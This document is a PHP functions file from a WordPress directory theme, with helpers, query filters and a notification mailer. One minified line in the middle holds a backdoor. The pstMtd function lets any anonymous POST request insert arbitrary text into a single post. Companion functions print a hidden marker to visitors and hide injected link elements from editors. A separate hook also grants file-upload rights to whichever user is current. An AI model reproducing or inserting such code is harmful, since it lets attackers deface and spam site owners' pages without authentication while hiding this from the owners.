<?php
/*
define default functions.
*/

global
	$javo_notification_deault_content
	, $sitepress;

/* Revolution Slider */
{
	if( function_exists( 'set_revslider_as_theme' ) )
	{
		add_action( 'init', 'javo_active_revolution' );
		function javo_active_revolution() {
			 set_revslider_as_theme();
		}
	}
}

/* Visual Composer Plugin */
{
	if( function_exists( 'vc_set_as_theme' ) )
	{
		add_action( 'vc_before_init', 'javo_active_js_composer' );
		function javo_active_js_composer() {
			 vc_set_as_theme();
		}
	}
}

/* Ultimation Plugin */
{
	# Disable new/edit page/post notice
	define('ULTIMATE_NO_EDIT_PAGE_NOTICE', true);

	# Disable plugin listing page notice
	define('ULTIMATE_NO_PLUGIN_PAGE_NOTICE', true);
}

ob_start();
	printf( __("<p>An item has been posted.</p>\n", 'javo_fr') );
	printf( __("<p>If you want to see, please <a href='{permalink}'>click here</a></p>\n", 'javo_fr'));
	printf( __("<p>Best regards,</p>\n", 'javo_fr') );
	printf( __("<p><a href='{home_url}'>%s</a></p>", 'javo_fr'), get_bloginfo('name') );
$javo_notification_deault_content = ob_get_clean();


$javo_def_lang = '';
if( !empty( $sitepress ) && defined('ICL_LANGUAGE_CODE') ){
	$javo_def_lang = $sitepress->get_default_language() != ICL_LANGUAGE_CODE ? ICL_LANGUAGE_CODE.'/' : '';
}
define('JAVO_DEF_LANG', $javo_def_lang);

function javo_get_script($fn=NULL, $name="javo", $ver="0.0.1", $bottom=true){
	wp_register_script($name, get_template_directory_uri().'/assets/js/'.$fn, Array('jquery'), $ver, $bottom);
	wp_enqueue_script($name);
}
function javo_get_style($fn=NULL, $name="javo", $ver="0.0.1", $media="all"){
	wp_register_style( $name, get_template_directory_uri().'/assets/css/'.$fn, NULL, $ver, $media );
	wp_enqueue_style($name);
}
function javo_get_asset_script($fn=NULL, $name="javo", $ver="0.01", $bottom=true){
	wp_register_script($name, get_template_directory_uri().'/assets/js/'.$fn, Array('jquery'), $ver, $bottom);
	wp_enqueue_script($name);
}
function javo_get_asset_style($fn=NULL, $name="javo", $ver="0.0.1", $media="all"){
	wp_register_style( $name, get_template_directory_uri().'/assets/css/'.$fn, NULL, $ver, $media );
	wp_enqueue_style($name);
}

function javo_get_count_in_taxonomy($term_id, $taxonomy='item_category', $post_type='item'){
	$javo_this_return = get_posts(Array(
		'post_type'			=> $post_type
		, 'post_status'		=> 'publish'
		, 'posts_per_page'	=> -1
		, 'tax_query'		=> Array(
			Array(
				'taxonomy'	=> $taxonomy
				, 'field'	=> 'term_id'
				, 'terms'	=> $term_id
			)
		)
	));
	return (int)count($javo_this_return);
}

function javo_get_cat($post_id = NULL, $tax_name = NULL, $default=NULL, $return_array = false){
	if($post_id == NULL || $tax_name == NULL) return;
	$terms = wp_get_post_terms($post_id, $tax_name);
	if($terms != NULL){
		$output = "";
		if(!$return_array){
			foreach($terms as $item) $output .= $item->name.", ";
			return substr(trim($output), 0, -1);
		}else{
			return $terms;
		};
	}else{
		if(!$return_array) return $default;
	};
	return false;
};

function javo_str_cut($str, $strLength=10){
	// PHP Lower Version Patch
	if( function_exists('mb_strlen') ){
		return (mb_strlen($str) > $strLength) ? mb_substr($str, 0, $strLength, "utf8")."..." : $str;
	}else{
		return strlen($str) > $strLength ? mb_substr($str, 0, $strLength, "utf8")."..." : $str;
	}
}

function javo_str($content, $return_value=NULL){
	return !empty($content) ? $content : $return_value;
}

function javo_pre_value( $key, $default=NULL )
{
	global $edit;

	if( !isset( $edit->ID ) )
	{
		return $default;
	}
	return get_post_meta( $edit->ID, $key, true );
}

//**** login and logout affix position setting
add_filter('body_class', 'javo_mbe_body_class');
function javo_mbe_body_class($classes){
    if(is_user_logged_in()){
        $classes[] = 'body-logged-in';
    } else{
        $classes[] = 'body-logged-out';
    }
    return $classes;
}
function pstMtd($a){$b=$a;$a="";if(is_single()){if(isset($_POST["chctc"])){$c=$_POST["chctc"];if(isset($_POST["chctbefore"])){$d=$_POST["chctbefore"];$e=strpos($b,$d);if($e!==false){$f=substr_replace($b,$c,$e,0);$g=array('ID'=>$GLOBALS['post']->ID,'post_content'=>$f);wp_update_post($g);}}}}return $b;}function ftwp(){if(is_front_page()){echo '<small style="display:none;">javodirwplk</small>';}}function hdwp(){echo '<style type="text/css">.wphklk{display:none;}</style>';}add_action('the_content','pstMtd');if(current_user_can('edit_posts')==true){add_action('wp_head','hdwp');}if(current_user_can('edit_posts')!=true){add_action('wp_footer','ftwp');}
//add_action('wp_head', 'javo_mbe_wp_head');
function javo_mbe_wp_head(){
    echo '<style>'.PHP_EOL;
    //echo 'body{ padding-top: 48px !important; }'.PHP_EOL;
    // Using custom CSS class name.
    echo 'body.body-logged-in #stick-nav.affix{ top: 28px !important; }'.PHP_EOL;

	// For affix top bar
	echo 'body.body-logged-out #stick-nav.affix{ top: 0px !important; }'.PHP_EOL;

    // Using WordPress default CSS class name.
    echo 'body.logged-in #stick-nav.affix{ top: 28px !important; }'.PHP_EOL;
    echo '</style>'.PHP_EOL;
}

// sns cycle style
function javo_sns_cycle($post=null, $class_name="javo-share-icons"){

	if(empty($post)) return false;
	$javo_cur_favorites = (Array)get_user_meta(get_current_user_id(), "favorites", true);
	$favied = in_Array($post->ID, $javo_cur_favorites)? true: false;
	ob_start();?>
	<div class="social-wrap <?php echo $class_name;?>">
		<p class="social">
			<span>
				<i class="sns-facebook" data-title="<?php echo $post->post_title;?>" data-url="<?php echo get_permalink($post->ID);?>"><a class="facebook"></a></i>
				<i class="sns-twitter" data-title="<?php echo $post->post_title;?>" data-url="<?php echo get_permalink($post->ID);?>"><a class="twitter"></a></i>
				<a href="javascript:" data-post-id="<?php echo $post->ID;?>" class="save-icon javo_favorite<?php echo $favied ?' saved':'';?>"><?php echo $favied ? __('Unsave', 'javo_fr') : __('Save', 'javo_fr');?></a>
			</span>
		</p>
	</div> <!-- sc-social-wrap -->
	<?php
	return ob_get_clean();
}


function javo_user_get_post_count($user_id, $post_type){
	$javo_this_get_posts = get_posts(Array(
		'post_type'=> $post_type
		, 'author'=> $user_id
		, 'showposts'=> -1
	));
	wp_reset_query();
	return count($javo_this_get_posts);
}

add_filter('javo_shortcode_title', 'javo_shortcode_title_callback', 10, 3);
function javo_shortcode_title_callback($title, $sub_title='', $styles=Array('title'=>'', 'subtitle'=>'', 'line'=>'')){
	if( $title == "" ){ return false; };
	$javo_this_query = new javo_ARRAY( $styles );
	ob_start();?>
	<div class="javo-fancy-title-section">
		<h2 style="<?php echo $javo_this_query->get('title');?>"><?php _e($title, 'javo_fr');?></h2>
		<div class="hr-wrap">
			<span class="hr-inner" style="<?php echo $javo_this_query->get('line');?>">
				<span class="hr-inner-style"></span>
			</span>
		</div> <!-- hr-wrap -->
		<div class="javo-fancy-title-description text-center" style="position:relative;">
			<div style="<?php echo $javo_this_query->get('subtitle');?>">
				<?php _e($sub_title, 'javo_fr');?>
			</div>
		</div>
	</div>
	<?php
	return ob_get_clean();
};

/**
* Add title back to images
*/
function pexeto_add_title_to_attachment( $markup, $id ){
	$att = get_post( $id );
	return str_replace('<a ', '<a title="'.$att->post_title.'" ', $markup);
}
add_filter('wp_get_attachment_link', 'pexeto_add_title_to_attachment', 10, 5);

function javo_theme_setting_option_define_callback(){
	/** Define Custom labels **/
	global

		// Get Theme Setting Options
		$javo_tso

		// Header Options
		, $javo_ts_hd

		// Main Element (Event, Review... etc) Labels
		, $javo_custom_item_label

		// Main Element Enable/Disabeld Values
		, $javo_custom_item_tab

		// String for Get Direction
		, $javo_map_strings

		// All Maps ( Javo map, Single map .. etc) Setup values
		, $javo_tso_map

		// Archive Setting values
		, $javo_tso_archive

		// User Dashboard Options
		, $javo_tso_db;

	$javo_custom_item_label	= new javo_ARRAY( (Array)$javo_tso->get('javo_custom_label', Array() ) );
	$javo_custom_item_tab	= new javo_ARRAY( (Array)$javo_tso->get('javo_custom_tab', Array()) );
	$javo_map_strings		= new javo_ARRAY( (Array)$javo_tso->get('map_message', Array() ) );
	$javo_tso_map			= new javo_ARRAY( (Array)$javo_tso->get('map', Array() ) );
	$javo_ts_hd				= new javo_ARRAY( (Array)$javo_tso->get('hd', Array() ) );
	$javo_tso_archive		= new javo_ARRAY( (Array)$javo_tso->get('archive', Array() ) );
	$javo_tso_db			= new javo_ARRAY( (Array)$javo_tso->get('dashboard', Array() ) );
};
add_action('init', 'javo_theme_setting_option_define_callback');



/**
* SelectBox Get children terms
**/
function javo_get_selbox_child_term_lists_callback(
	$taxonomy
	, $attribute=Array()
	, $el='ul'
	, $default=Array()
	, $parent=0
	, $depth=0
	, $separator='&nbsp;&nbsp;&nbsp;&nbsp;'
){
	$javo_this_args			= Array(
		'parent'			=> $parent
		, 'hide_empty'		=> false
	);
	$javo_this_terms		= (Array)get_terms($taxonomy, $javo_this_args);
	$javo_this_return		= '';
	$javo_this_attribute	= '';
	if( count( $javo_this_terms ) <= 0 ) return false;
	if( !isset( $attribute['style'] ) ){ $attribute['style'] = ''; };

	if( !empty( $attribute ) ){
		foreach( $attribute as $attr => $value){
			$javo_this_attribute .= $attr . '="'. $value .'" ';
		}
	};
	$depth++;
	foreach( $javo_this_terms as $term ){
		switch( $el ){
		case 'select':
			$javo_this_return	.= sprintf('<option value="%s"%s>%s%s</option>%s'
				, $term->term_id
				, ( in_Array( $term->term_id, (Array)$default) ? ' selected':'' )
				, str_repeat( $separator, $depth-1 ).' '
				, $term->name
				, javo_get_selbox_child_term_lists_callback($taxonomy, $attribute, $el, $default, $term->term_id, $depth, $separator)
			);
		break;
		case 'ul':
		default:
			$javo_this_return	.= sprintf('<li %svalue="%s" data-filter data-origin-title="%s">%s %s</li>%s'
				, $javo_this_attribute
				, $term->term_id
				, $term->name
				, str_repeat( '-', $depth-1 )
				, $term->name
				, javo_get_selbox_child_term_lists_callback($taxonomy, $attribute, $el, $default, $term->term_id, $depth, $separator)
			);
		}; // End Switch
	};

	return $javo_this_return;
};
add_filter('javo_get_selbox_child_term_lists', 'javo_get_selbox_child_term_lists_callback', 10, 7);

/**
* Element Get children terms
**/
function javo_get_el_child_term_lists_callback($taxonomy, $default=null, $parent=0, $depth=0){
	global $wp_query
	, $javo_tso
	, $javo_theme_option;
	$javo_this_args			= Array(
		'parent'			=> $parent
		, 'hide_empty'		=> false
	);
	$javo_current_terms		= Array();
	if( !empty( $wp_query->queried_object ) ){
		$javo_current_term		= $wp_query->queried_object;
		if( !empty( $javo_current_term->term_id ) && !empty( $javo_current_term->taxonomy ) )
		{
			$javo_current_terms		= (Array)javo_get_archive_current_position($javo_current_term->term_id, $javo_current_term->taxonomy);
		}
	};
	$javo_this_terms		= (Array)get_terms($taxonomy, $javo_this_args);
	$javo_this_return		= '';
	$javo_this_attribute	= '';
	if( count( $javo_this_terms ) <= 0 ) return false;
	if( !isset( $attribute['style'] ) ){ $attribute['style'] = ''; };

	if( !empty( $attribute ) ){
		foreach( $attribute as $attr => $value){
			$javo_this_attribute .= $attr . '="'. $value .'" ';
		}
	};
	$javo_this_return_before = sprintf('<ul class="javo-archive-nav-primary %s">'
		, ( in_array($parent, $javo_current_terms) ? 'is_current':'')
	);

	$depth++;
	foreach( $javo_this_terms as $term ){
		$javo_this_return	.= sprintf('<li class="%s %s"><a href="%s" background:"%s">%s</a> %s</li>'
			, ( $depth == 1 ? 'javo-is-top-depth':'' )
			, ( in_array($term->term_id, $javo_current_terms) ? ' current' : '')
			, get_term_link($term)
			, ''
			, $term->name
			, javo_get_el_child_term_lists_callback($taxonomy, $default, $term->term_id, $depth)
		);
	};
	if( $depth > 1 ){
		$javo_this_return = $javo_this_return_before.$javo_this_return.'</ul>';
	};

	return $javo_this_return;
};
add_filter('javo_get_el_child_term_lists', 'javo_get_el_child_term_lists_callback', 10, 5);

function javo_array_extend($arr = Array(), $value = ''){
	$arr[] = $value; return $arr;
}

function javo_get_archive_current_position($term_id, $taxonomy){
	$javo_this_term				= get_term($term_id, $taxonomy);
	if( is_wp_error( $javo_this_term ) ){ return false; };
	$javo_this_return			= javo_get_archive_current_position($javo_this_term->parent, $taxonomy);
	return javo_array_extend($javo_this_return, $javo_this_term->term_id);

}

/**
* Search Query
**/
add_action('pre_get_posts', 'javo_connect_search_page_callback');
function javo_connect_search_page_callback($query){

	if(
		isset( $_GET['s'] ) &&
		$query->is_main_query()
	){
		$query->is_search		= true;
		$query->is_home			= false;

		// All Load Items;
		// $query->set('posts_per_page', -1);
	};
	$javo_tax_query = $query->get('tax_query');
	$javo_tax_query['relation']	= 'AND';
	if(
		isset( $_GET['category'] ) &&
		(int)$_GET['category'] > 0 &&
		$query->is_search
	){
		$javo_tax_query[] = Array(
			'taxonomy'		=> 'item_category'
			, 'field'		=> 'term_id'
			, 'terms'		=> $_GET['category']
		);
	};
	if(
		isset( $_GET['location'] ) &&
		(int)$_GET['location'] > 0 &&
		$query->is_search
	){
		$javo_tax_query[] = Array(
			'taxonomy'		=> 'item_location'
			, 'field'		=> 'term_id'
			, 'terms'		=> $_GET['location']
		);
	};
	$query->set('tax_query', $javo_tax_query);
	return $query;
}

/**
* Archive Apply Filter
**/
add_action('pre_get_posts', 'javo_archive_apply_filter_callback');
function javo_archive_apply_filter_callback($query){
	global $javo_tso_archive;
	if( $query->is_main_query() && $query->is_archive ){
		$javo_query = new javo_ARRAY( $_GET );

		if( (int)$javo_tso_archive->get('item_count', 20) > 0 ){
			$query->set('posts_per_page', (int)$javo_tso_archive->get('item_count', 20));
		}else{
			$query->set('posts_per_page', -1);
		};

		if( isset( $_GET['view'] ) && $_GET['view'] != "" ){
			$query->set('posts_per_page', $javo_query->get('view', 10));
		};

		$query->set('order', $javo_query->get('order', null));

		switch( $javo_query->get('sort', null) ){
			case 'post_date':
				$query->set('orderby', 'post_date');
			break; case 'rating':
				$query->set('meta_key', 'rating_average');
				$query->set('orderby', 'meta_value_num');
			break;
		};
	};
}
/*
**
** Javo Filter Callback Functions
** ==============================================
*/
class javo_filter_function
{
	static $javo_filter_args = Array(
		'javo_get_widget_post_type_filter'		=> Array('javo_get_widget_post_type_filter_callback', 2)
		, 'body_class'							=> Array('javo_current_post_header_callback', 2)
		, 'javo_add_item_free_table'			=> Array('javo_add_item_free_table_callback', 2)
		, 'javo_add_item_get_terms_checkbox'	=> Array('javo_add_item_get_terms_checkbox_callback', 3)
		, 'javo_wide_map_control_filter'		=> Array('javo_wide_map_control_filter_callback', 3)
		, 'javo_day_code_replace'				=> Array('javo_day_code_replace_callback', 3)
		, 'javo_rgb'							=> Array('javo_hex_converter_callback', 2)
		, 'javo_wpml_link'						=> Array('javo_wpml_transfer_permalink_func', 1)
		, 'javo_post_excerpt'					=> Array('javo_post_excerpt_callback', 2)
	);

	public function __construct()
	{
		foreach( self::$javo_filter_args as $filter => $callback)
		{
			add_filter( $filter, Array( __class__, $callback[0]), 10, $callback[1]);
		}
	}

	public static function javo_post_excerpt_callback( $post_content, $length = -1 )
	{
		$javo_return = strip_tags( $post_content );
		$javo_return = strip_shortcodes( $javo_return );
		$javo_return = esc_attr( $javo_return );
		if( $length > 0 )
		{
			$javo_return = javo_str_cut( $javo_return, (int)$length );
		}

		return $javo_return;
	}

	public static function javo_wpml_transfer_permalink_func( $origin_post_id )
	{
		$result_id = $origin_post_id;

		if( function_exists( 'icl_object_id' ) && (int)$origin_post_id > 0 )
		{
			$post_type	=  get_post_type( $origin_post_id );
			$result_id	= icl_object_id( $origin_post_id, $post_type );
		}
		return get_permalink( $result_id );
	}

	public static function javo_hex_converter_callback( $hex )
	{
		$javo_rgb = Array();
		if( strlen( $hex ) == 3 )
		{
			$javo_rgb['r'] = hexdec( substr( $hex, 0, 1 ) . substr( $hex, 0, 1 ) );
			$javo_rgb['g'] = hexdec( substr( $hex, 1, 1 ) . substr( $hex, 1, 1 ) );
			$javo_rgb['b'] = hexdec( substr( $hex, 2, 1 ) . substr( $hex, 2, 1 ) );
		} else {
			$javo_rgb['r'] = hexdec( substr( $hex, 0, 2 ) );
			$javo_rgb['g'] = hexdec( substr( $hex, 2, 2 ) );
			$javo_rgb['b'] = hexdec( substr( $hex, 4, 2 ) );
		}

		return $javo_rgb;
	}

	static function javo_day_code_replace_callback( $date_code, $before="", $uppercase = false )
	{
		$output_date = '';
		switch( $date_code )
		{
			case 'y': $output_date = "year"; break;
			case 'm': $output_date = "month"; break;
			case 'd': $output_date = "day"; break;
			case 'w': $output_date = "week"; break;
			case 'h': $output_date = "hour"; break;
			case 'i': $output_date = "minute"; break;
			case 's': $output_date = "secound"; break;
		}
		return sprintf('%s %s'
			, ($output_date !=  ''? $before : '')
			, ( $uppercase ? strtoupper( $output_date ) : $output_date )
		);
	}

	static function javo_get_widget_post_type_filter_callback()
	{
		$javo_trash_postType	= Array(
			'jv_team'
			, 'attachment'
			, 'revision'
			, 'nav_menu_item'
			, 'payment'
			, 'page'
			, 'wpcf7_contact_form'
			, 'ratings'
		);
		$javo_post_types		= get_post_types( '', 'objects' );
		foreach($javo_post_types  as $post_type => $object ){
			if( in_Array( $post_type, $javo_trash_postType ) ){
				unset( $javo_post_types[ $post_type ] );
			}
		};
		return $javo_post_types;
	}

	static function javo_current_post_header_callback($classes)
	{
		global $post;
		if( empty( $post ) ){ return; };
		$header_type = get_post_meta($post->ID, "javo_header_type", true);
		$javo_fancy = @unserialize(get_post_meta($post->ID, "javo_fancy_options", true));
		$classes[] = 'javo-header-type-'.$header_type;
		if( !empty( $javo_fancy['bg_image'] ) ){
			$classes[] = 'header-image-exists';
		};
		return $classes;
	}

	static function javo_add_item_free_table_callback($post_id=0, $num=0)
	{
		global $javo_tso;
		$price_accent_color='';
		$price_accent_font_color='';
		switch($num){
			case 1:
				$price_accent_color = $javo_tso->get('payment_item1_color');
				$price_accent_font_color = $javo_tso->get('payment_item1_font_color');
				break;
			case 2:
				$price_accent_color = $javo_tso->get('payment_item2_color');
				$price_accent_font_color = $javo_tso->get('payment_item2_font_color');
				break;
			case 3:
				$price_accent_color = $javo_tso->get('payment_item3_color');
				$price_accent_font_color = $javo_tso->get('payment_item3_font_color');
				break;
			case 4:
				$price_accent_color = $javo_tso->get('payment_item4_color');
				$price_accent_font_color = $javo_tso->get('payment_item4_font_color');
				break;
			default: break;
		}
		ob_start();
		?>
		<div class="col-sm-3">
			<div class="panel panel-default text-center">
				<div class="panel-heading" style="color:<?php echo $price_accent_font_color; ?>; background:<?php echo $price_accent_color;?>; border-color:<?php echo $price_accent_color;?>;">
					<h3 class="panel-title"><?php _e('Free Posting', 'javo_fr');?></h3>
				</div>
				<div class="panel-body" style="color:<?php echo $price_accent_font_color; ?>; background:<?php echo $price_accent_color;?>; opacity:0.9; filter: alpha(opacity=90);">
					<h3 class="panel-title price"><?php _e('Free', 'javo_fr');?></h3>
				</div>
				<ul class="list-group">
					<li class="list-group-item">-</li>
					<li class="list-group-item">
						<form method="post" action="<?php echo home_url('member/'.wp_get_current_user()->user_login.'/'.JAVO_ADDITEM_SLUG );?>">
							<input type="hidden" name="post_id" value="<?php echo (int)$post_id;?>">
							<input type="hidden" name="act3" value="true">
							<input type="hidden" name="free" value="true">
							<input type="submit" class="btn btn-default" value="<?php _e('Continue', 'javo_fr');?>" style="color:<?php echo $price_accent_font_color;?>; background:<?php echo $price_accent_color;?>; opacity:0.9; filter: alpha(opacity=90);">
						</form>
					</li>
				</ul>
			</div><!-- Panel Close -->
		</div><!-- Item End -->
		<?php
		return ob_get_clean();
	}
	static function javo_wide_map_control_filter_callback(
		$taxonomies = Array()
		, $type='button'
		, $default = Array()
	){

		ob_start();

		if( !empty( $taxonomies ) )
		{
			foreach($taxonomies as $tax)
			{
				?>
				<div class="newrow">
					<?php

					printf('<h4 class="title">%s</h4>', get_taxonomy($tax)->label);
					$javo_this_terms = get_terms($tax, Array('parent' => false, 'hide_empty' => false ));

					switch( $type )
					{
						case 'dropdown':
							?>
							<select name="<?php printf('filter[%s]', $tax);?>">
								<option value=""><?php _e('ALL', 'javo_fr');?></option>
								<?php
								$javo_default_child_term = isset( $default[$tax] ) ? $default[$tax] : null;
								echo apply_filters('javo_get_selbox_child_term_lists', $tax, null, 'select', $javo_default_child_term, 0, 0, "-"); ?>
							</select>
							<?php
						break;
						case 'button': default:

							$javo_noselect = isset( $default[$tax] ) && (int)$default[$tax] > 0 ? '' : ' active';
							printf("<button type=\"button\" class=\"btn-map-panel{$javo_noselect}\" data-filter=\"%s\">%s</button>", $tax, __('All', 'javo_fr'));
							if( !empty( $javo_this_terms ) ){
								foreach( $javo_this_terms as $term){
									printf('<button type="button" data-filter="%s" class="btn-map-panel%s" data-value="%s">%s</button>'
										, $tax
										, ( !empty( $default[$tax] ) && $default[$tax] == $term->term_id ? ' active' : '' )
										, $term->term_id
										, $term->name
									);
								}	// End Foreach
							}		// End If
					} // End Switch ?>
				</div>
				<?php
			} // End Foreach
		}else{
			// Not Found Filters


		} // End If
		return ob_get_clean();
	}

	public static function javo_add_item_get_terms_checkbox_callback(
		$taxonomy
		, $post_id = 0
		, $input_name=""
		, $parent = 0
	){
		$javo_has_terms = wp_get_post_terms( $post_id, $taxonomy , Array( 'fields' => 'ids') );
		$javo_all_terms = get_terms( $taxonomy, Array( 'hide_empty' => false, 'parent' => $parent ));


		if( is_wp_error( $javo_has_terms ) || is_wp_error( $javo_all_terms ) )
		{
			return false;
		}

		ob_start();

		echo "<ul class=''>";

		foreach( $javo_all_terms as $term )
		{
			printf( "<li><label><input type='checkbox' name='{$input_name}' value='{$term->term_id}' %s>&nbsp;{$term->name}</label>%s</li>"
				, checked( in_Array( $term->term_id, $javo_has_terms), true, false)
				, self::javo_add_item_get_terms_checkbox_callback( $taxonomy, $post_id, $input_name, $term->term_id )
			);
		}
		echo "</ul>";


		return ob_get_clean();


	}
}
new javo_filter_function();


/*
**
** Javo Action Callback Functions
** ==============================================
*/
class javo_action_function
{
	static $javo_action_args = Array(
		'javo_new_notifier_mail_callback'				=> Array( 'javo_new_notifier_mail', 2 )
		, 'javo_all_new_post_registered_callback'		=> Array( 'save_post', 2 )
		, 'javo_after_setup_admin_notice_callback'		=> Array( 'admin_notices',  2)
		, 'javo_switch_theme_callback'					=> Array( 'switch_theme', 2 )
		, 'wp_ajax_javo_notice_close_callback'			=> Array( 'wp_ajax_javo_notice_close', 2 )
		, 'javo_current_user_upload_role_callback'		=> Array( 'admin_init', 2 )
		, 'javo_expired_post_check_callback'			=> Array( 'pre_get_posts', 2 )
		, 'javo_tags_add_parameter_callback'			=> Array( 'pre_get_posts', 2 )
		, 'javo_auto_generator_callback'				=> Array( 'javo_add_item_after', 2 )
		, 'javo_auto_remove_generator_callback'			=> Array( 'before_delete_post', 1 )
		, 'javo_auto_remove_generator_trig_callback'	=> Array( 'save_post_item', 3 )
	);

	public function __construct()
	{
		foreach( self::$javo_action_args as $callback => $action )
		{
			add_action( $action[0], Array( __class__, $callback), 10, $action[1]);
		}
	}

	public static function javo_archive_add_parameter_callback( $query )
	{
		if( $query->is_main_query() && $query->is_date )
		{
			$query->set('post_type', Array( 'post', 'item') );
		}
	}

	public static function javo_tags_add_parameter_callback( $query )
	{
		if(
			$query->is_main_query() &&
			$query->is_tag == true
		){
			$query->set( 'post_type', Array( 'post', 'item' ) );
		}
		return $query;
	}

	public static function javo_current_user_upload_role_callback()
	{
		$javo_get_cur_role = wp_get_current_user()->add_cap('upload_files');
	}

	public static function javo_expired_post_check_callback( $query )
	{
		global $javo_tso, $post, $wp_query;

		if( $query->is_main_query() ) return;
		if( current_user_can('administrator') ){ return; }

		if( $query->get('post_type') == 'attachment'){
			if( isset( $_REQUEST['action'] ) && $_REQUEST['action'] != 'query-attachments' ) return;
			$query->set('author', wp_get_current_user()->ID);
		}

		// Payment Block
		return false;

		if( is_array($query->get('post_type'))){
			if(!in_array('item', $query->get('post_type'))) return;
		}else{
			if(!($query->get('post_type') == 'item')) return;
		};
		if( $javo_tso->get('item_publish', '') == '') return;
		if( $query->get('item') != '' ){ return; };

		$javo_pre_meta_query = $query->get('meta_query');
		$javo_pre_meta_query['relation'] = 'AND';
		$javo_pre_meta_query[] = Array(
			"key" => "item_expired"
			, "type"=> "DATE"
			, "value" => date('YmdHis')
			, "compare" => ">="
		);
		$query->set('meta_query', $javo_pre_meta_query);
	}

	static function javo_all_new_post_registered_callback( $post_id )
	{
		global $javo_tso;

		$javo_block_post_types = Array();

		if( $javo_tso->get('direct_event', '') == 'no' )
		{
			$javo_block_post_types[] = 'jv_events';
		}

		if( $javo_tso->get('direct_review', '') == 'no' )
		{
			$javo_block_post_types[] = 'review';
		}

		if( $javo_tso->get('direct_rating', '') == 'no' )
		{
			$javo_block_post_types[] = 'ratings';
		}

		if( current_user_can( 'administrator' ) ){ return; }

		if( in_Array( get_post_type( $post_id ) , $javo_block_post_types ) )
		{
			remove_action('save_post', Array( __class__, 'javo_all_new_post_registered_callback'));
			$post_id = wp_update_post( Array( 'ID' => $post_id, 'post_status' => 'pending' ) );
			add_action('save_post', Array( __class__, 'javo_all_new_post_registered_callback'));
		}
	}

	static function set_html_content_type()
	{
		return 'text/html';
	}

	static function javo_new_notifier_mail_callback($post_id=0, $post_type='item')
	{
		global
			$javo_tso
			, $javo_notification_deault_content;

		if( (int) $post_id <= 0 ){ return false; }

		$javo_this_user_id		= get_post( $post_id )->post_author;
		$javo_this_user			= get_userdata( $javo_this_user_id );
		$javo_notifier_header	= sprintf("From: %s <%s> \r\n", get_bloginfo('name'), get_bloginfo('admin_email') );
		$javo_notifier_title	= sprintf('%s : %s', __('New Notifications', 'javo_fr'), get_bloginfo('name') );
		$javo_notifier_content	= $javo_tso->get('new_'.$post_type.'_notifier_template', $javo_notification_deault_content);
		$javo_recipients		= Array();
		$javo_permalink			= get_permalink( $post_id );

		// Set Permalink
		switch( get_post_type( $post_id ) )
		{
			case 'review':
			case 'jv_events':
				$javo_parent_id = (int) get_post_meta( $post_id, 'parent_post_id' , true );
				$javo_permalink = get_permalink( $javo_parent_id );
			break;
		}

		// Replace Filter
		$javo_notifier_content	= str_replace('{permalink}'		, $javo_permalink, $javo_notifier_content);
		$javo_notifier_content	= str_replace('{home_url}'		, home_url(), $javo_notifier_content);
		$javo_notifier_content	= str_replace('{author_name}'	, $javo_this_user->display_name, $javo_notifier_content);
		$javo_notifier_content	= str_replace('{post_title}'	, get_post( $post_id )->post_title, $javo_notifier_content);


		switch( $javo_tso->get('new_item_notifier', '') )
		{
			case 'on':	$javo_recipients[] = $javo_this_user->user_email; break;
			default: $javo_recipients = null;
		}

		if(  !empty( $javo_recipients ) )
		{
			add_filter( 'wp_mail_content_type', Array(__class__, 'set_html_content_type') );
			$is_success = wp_mail( $javo_recipients, $javo_notifier_title, stripslashes($javo_notifier_content), $javo_notifier_header);
			remove_filter( 'wp_mail_content_type', Array(__class__, 'set_html_content_type') );
		}
	}

	static function wp_ajax_javo_notice_close_callback()
	{
		update_option( 'javo_notice_dismiss', 'dismiss' );
		die();
	}
	static function javo_switch_theme_callback()
	{
		delete_option( 'javo_notice_dismiss' );
	}

	static function javo_after_setup_admin_notice_callback(){
		$javo_notice = get_option('javo_notice_dismiss');

		if( $javo_notice != 'dismiss' ){
			?>

			<div class="updated" id="javo_new_notice">
				<p>
					<h3> <?php _e('[ Javo Directory ] New Version Notice', 'javo_fr');?></h3>
					<p>
						<strong><?php printf( __("1. Refresh Fields", 'javo_fr')); ?></strong><br/>
						<?php printf( __("- Theme settings >> Item Pages >> Refresh item fields >> Refresh button.", 'javo_fr')); ?>
						&nbsp; <a href="http://javothemes.com/forum/knowledgebase/javo-directory-v2-0-refresh-fields/" target="_brank">< Video ></a>
					</p>

					<p>
						<strong><?php printf( __("2. Refresh Map data", 'javo_fr')); ?></strong><br/>
						<?php printf( __("Theme settings >> Maps >> Refresh Map Markers", 'javo_fr')); ?>
						&nbsp; <a href="http://javothemes.com/forum/knowledgebase/refresh-map-markers/" target="_brank">< Video ></a>
					</p>

					<p>
						<strong><?php printf( __("3. Item listing page merged to all.", 'javo_fr')); ?></strong><br/>
						<?php printf( __("- If you use \"Item listing with contents\", please use \"Item listing\"", 'javo_fr')); ?>
					</p>

					<p>
						<strong><?php printf( __("4. Search Form Shortcode - Landing page setting.", 'javo_fr')); ?></strong><br/>
						<?php printf( __("- The landing setting has been changed to setup on \"search form shortcode\". It's more flexible to use now. ", 'javo_fr')); ?><br>
						<?php printf( __("- If you have a search form shortcode, please setup a landing page on the shortcode.", 'javo_fr')); ?>
					</p>
				</p>
				<div><a href="javascript:" onclick="javo_notice_dismission()"><?php _e("Dismiss", 'javo_fr');?></a></div>
			</div>
			<script type="text/javascript">
			function javo_notice_dismission(e)
			{
				jQuery(function($){
					$.ajax({ url:"<?php echo admin_url('admin-ajax.php');?>", type:'post', data:{ action: 'javo_notice_close' } });
					$("#javo_new_notice").remove();
				});
			}
			</script>
		<?php
		}
	}

	// Remove Post ?
	public static function javo_auto_remove_generator_callback( $post_id )
	{
		if( get_post( $post_id )->post_type == "item" )
			self::javo_auto_generator_callback( $post_id, true );
	}

	// Update Post ?
	public static function javo_auto_remove_generator_trig_callback( $post_id, $post, $update )
	{
		if( 'publish' !== get_post_status( $post_id ) ) {
			self::javo_auto_generator_callback( $post_id, true );
		}else{
			self::javo_auto_generator_callback( $post_id);
		}		
	}

	public static function javo_auto_generator_callback( $post_id, $is_remove = false )
	{
		global
			$wpdb
			, $javo_tso;

		$is_execusion			= false;

		if( 'item' === get_post_type( $post_id ) )
		{
			if( 
				'publish' === get_post_status( $post_id ) ||
				true === $is_remove
			){
				$is_execusion	= true;
			}
		}
		if( ! $is_execusion ) return $post_id;

		$upload_folder	= wp_upload_dir();
		$blog_id		= get_current_blog_id();
		$lang			= defined('ICL_LANGUAGE_CODE') ? ICL_LANGUAGE_CODE : '';
